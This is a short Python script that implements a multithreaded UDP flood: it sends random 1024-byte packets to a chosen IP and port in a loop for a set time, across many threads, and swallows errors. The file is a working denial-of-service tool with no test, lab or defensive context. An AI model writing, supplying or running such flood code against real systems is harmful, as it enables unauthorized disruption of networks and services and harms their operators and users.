import socket
import threading
import time
import random

def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock.sendto(payload, (ip, port))
        except:
            continue

def run_udp(ip, port, threads, duration):
    for _ in range(threads):
        t = threading.Thread(target=udp_flood, args=(ip, port, duration))
        t.start()
          
